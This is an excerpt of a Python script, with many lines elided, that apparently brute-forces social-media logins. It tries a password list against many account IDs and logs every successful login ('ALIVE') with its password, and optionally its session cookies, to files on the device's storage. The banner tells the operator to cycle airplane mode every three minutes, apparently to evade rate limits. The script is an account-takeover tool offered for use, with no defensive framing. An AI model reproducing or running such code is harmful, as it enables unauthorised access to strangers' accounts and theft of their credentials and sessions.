...
def method():
    ...
    m=input(f"{oo('!')}Input : ") 
    print('\n'+oo("?")+'Do you want to show dead Ids?(y/n)')
    ...
    print(f"{oo('•')}\033[1;89m ON OFF AIRPLANE MODE EVERY 3 MINUTES :")
    print(f"{oo('•')} FILE SAVE IN /sdcard/ART-ALIVE.txt")
    print('\033[1;89m='*63)
    print()
    ...
    def start(user):
     try:
        ...
        sys.stdout.write('\r\033[1;91m[\033[1;97mART-M1\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mALIVE : \033[1;92m{} \033[1;97mDEAD : \033[1;91m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
      ...
      #      print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;92mACCOUNT-ALIVE\033[1;92m] \033[1;92m'+acc+' \033[1;92m|\033[1;92m '+pword+'  ')
                open('/sdcard/ART-ALIVE.txt','a').write(f'{acc} | {pword}\n')
                if c=='y':
                    try:
                           ...
                           print(cookies)
                           open('/sdcard/ART-ALIVE.txt','a').write(f'sb={ssbb};{ckkk}\n')
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;91m[\033[1;93mACCOUNT-DEAD\033[1;91m] \033[1;93m'+acc+' \033[1;91m|\033[1;93m '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/ART-DEAD.txt','a').write(f'{acc} | {pword}\n')
                break
            else:
                continue
        loop += 1
    ...
    def start2(user):
      ...
      try:
        ...
        try:
            ...
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;91m[\033[1;97mART-M2\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mALIVE : \033[1;92m{} \033[1;97mDEAD : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:
